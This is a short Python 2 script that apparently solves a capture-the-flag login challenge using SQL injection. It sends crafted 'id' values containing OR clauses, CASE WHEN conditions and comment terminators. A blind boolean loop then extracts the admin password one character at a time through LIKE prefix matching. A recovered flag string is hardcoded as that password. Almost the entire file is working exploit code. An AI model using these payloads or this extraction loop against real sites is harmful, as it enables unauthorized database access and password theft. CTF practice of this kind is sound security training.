import requests

baseurl = 'http://chall.pwn-with.me/?page=login'

def postData(id, pw):
    params = {'id': id, 'pw': pw}
    res = requests.post(baseurl, data = params)
  
    #print res.text
    if res.text.find('Hello') > 0:
        return True
    else:
        return False


# print postData('''fqwrlqwrhqwklhflqf' or if(id='admin' and 0, 1, 0) or name='guest' order by name asc -- a''', 'guest')

print postData("fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND FALSE THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a", 'godj3')

# print postData('guest', 'guest')

print postData('guest', 'guest')

print postData('godj3', 'godj3')

print postData("sadawqoeqweqnnncxma' or id='godj3' -- a", 'godj3')

print postData("sadawqoeqweqnnncxma' or id='godj3' -- a", 'guest')

print postData('admin', 'kapo{j_s_bach_french_suites}')

payload = "fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND pw LikE '"

printable = "abcdefghijklmnopqrstuvwxyz0123456789i{}_"

payend = "%' THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a"

key = ''

for k in range(100):
    for i in printable:
        # print key + i,
        # print postData(payload + i + payend, 'godj3')
        if not postData(payload + key + i + payend, 'godj3'):
            print key + i
            key = key + i
            break
